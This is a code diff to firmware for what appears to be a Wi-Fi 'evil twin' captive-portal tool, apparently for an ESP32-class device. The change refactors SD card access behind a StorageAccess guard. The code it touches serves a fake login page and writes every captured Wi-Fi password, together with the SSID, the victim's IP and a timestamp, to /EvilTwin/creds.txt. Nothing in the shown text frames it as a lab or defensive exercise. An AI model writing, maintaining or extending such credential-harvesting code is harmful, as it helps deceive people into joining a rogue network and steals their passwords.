@@ -4,6 +4,7 @@
 #include <WebServer.h>
 #include <DNSServer.h>
 #include <SD.h>
+#include "storage_manager.h"
 #include <string.h>
 #include <stdio.h>
 #include <time.h>
@@ -35,7 +36,8 @@ static const byte DNS_PORT = 53;
 static String portal_page()
 {
     // Custom template from SD wins.
-    if (SD.exists("/EvilTwin/portal.html")) {
+    StorageAccess sd_access;
+    if (sd_access && SD.exists("/EvilTwin/portal.html")) {
         File f = SD.open("/EvilTwin/portal.html", FILE_READ);
         if (f) {
             String html = f.readString();
@@ -80,12 +82,17 @@ static void log_cred(const String &pass)
     strftime(clock, sizeof(clock), "%H:%M:%S",          &tm);
 
     // Persist every capture to SD (full history), independent of the RAM ring.
-    if (!SD.exists("/EvilTwin")) SD.mkdir("/EvilTwin");
-    File f = SD.open("/EvilTwin/creds.txt", FILE_APPEND);
-    if (f) {
-        f.printf("%s\tssid=%s\tip=%s\tpassword=%s\n",
+    {
+        StorageAccess sd_access;
+        if (sd_access) {
+            if (!SD.exists("/EvilTwin")) SD.mkdir("/EvilTwin");
+            File f = SD.open("/EvilTwin/creds.txt", FILE_APPEND);
+            if (f) {
+                f.printf("%s\tssid=%s\tip=%s\tpassword=%s\n",
                  ts, s_ssid, ip.toString().c_str(), pass.c_str());
-        f.close();
+                f.close();
+            }
+        }
     }
 
     // Push into the live ring buffer for the on-screen list. s_creds doubles
